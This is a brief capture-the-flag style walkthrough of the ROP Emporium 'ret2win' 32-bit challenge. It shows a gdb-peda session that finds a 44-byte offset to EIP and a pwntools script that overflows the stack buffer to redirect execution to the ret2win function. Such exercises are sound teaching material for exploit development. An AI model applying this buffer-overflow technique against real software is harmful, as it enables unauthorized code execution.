The binary is pretty straight forward about what we need to do:
```
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
```

Let's see how many bytes we need to write to overwrite EIP:

```
> gdb -q ./ret2win32
Reading symbols from ./ret2win32...(no debugging symbols found)...done.
gdb-peda$ pattern_create 50 input
Writing pattern of 50 chars to filename "input"
gdb-peda$ run < input
gdb-peda$ pattern_search
Registers contain pattern buffer:
...
EIP+0 found at offset: 44
...
```

All that is left to do is to find the address of the ret2win function and finalize the exploit:
```python
from pwn import *

bin = ELF('ret2win32')
ret_addr = bin.symbols.ret2win

p = process('ret2win32')
p.recvuntil('>')

payload = 'A'*44 + p32(ret_addr)
p.sendline(payload)

p.interactive()
```